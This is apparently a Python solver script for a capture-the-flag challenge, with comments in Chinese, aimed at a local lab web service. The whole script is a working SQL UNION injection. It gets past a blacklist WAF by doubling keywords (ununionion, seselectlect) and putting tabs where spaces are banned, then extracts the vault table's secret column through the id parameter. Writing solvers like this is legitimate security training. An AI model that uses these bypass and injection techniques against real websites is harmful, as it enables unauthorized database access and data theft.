#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import atexit
atexit.register(lambda: print("作者 ZluxYao"))
"""
Challenge 04 —— WAF 绕过型 UNION 注入。

WAF 黑名单：union, select, and, or, --, /*, #, 空格。
两个关键弱点：
  1) 关键词只做一次性剔除（非递归），双写即可还原：
     ununionion -> union，seselectlect -> select
  2) 只禁空格，制表符 \\t (%09) 可作分隔符。
原查询 3 列，第 2 列回显到 <h3>，故用 group_concat(secret) 取 vault 表数据。
"""

import argparse
import os
import re
import sys
from urllib.parse import quote

import requests

os.environ["NO_PROXY"] = "*"

DEFAULT_URL = os.environ.get("GKD_URL") or ("http://127.0.0.1:33494/")
FLAG_RE = re.compile(r"TOGOGO-flag\{[^}]+\}")
SP = "\t"  # 用制表符代替被禁的空格


def double_write(keyword: str) -> str:
    """把关键词折叠双写，使 WAF 剔除一次后恰好还原。union -> ununionion"""
    mid = len(keyword) // 2
    return keyword[:mid] + keyword + keyword[mid:]


def build_payload() -> str:
    union = double_write("union")
    select = double_write("select")
    # 0 让原行不命中，再 UNION 出 vault.secret；第2列回显
    return f"0{SP}{union}{SP}{select}{SP}1,group_concat(secret),3{SP}from{SP}vault"


def solve(args: argparse.Namespace) -> str | None:
    base_url = args.url.rstrip("/") + "/"
    session = requests.Session()
    session.trust_env = False
    session.headers.update({"User-Agent": "gkdctf-04-helper/1.0"})

    payload = build_payload()
    print(f"[*] Target: {base_url}")
    print(f"[*] Payload: ?id={quote(payload)}")

    resp = session.get(base_url, params={"id": payload}, timeout=args.timeout)
    print(f"[*] HTTP {resp.status_code}, len={len(resp.text)}")

    flag = FLAG_RE.search(resp.text)
    return flag.group(0) if flag else None


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="WAF 绕过 UNION 注入（双写关键词 + Tab 分隔）")
    parser.add_argument("--url", default=DEFAULT_URL, help=f"目标地址，默认 {DEFAULT_URL}")
    parser.add_argument("--timeout", type=float, default=8.0, help="HTTP 超时秒数")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    try:
        flag = solve(args)
    except requests.RequestException as exc:
        print(f"[-] 请求失败（容器可能挂了或端口变了）：{exc}", file=sys.stderr)
        return 1

    if not flag:
        print("\n[-] 没抓到 flag，确认 WAF 是否仍为一次性剔除、回显列是否变化。")
        return 2

    print(f"\n[+] FLAG: {flag}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
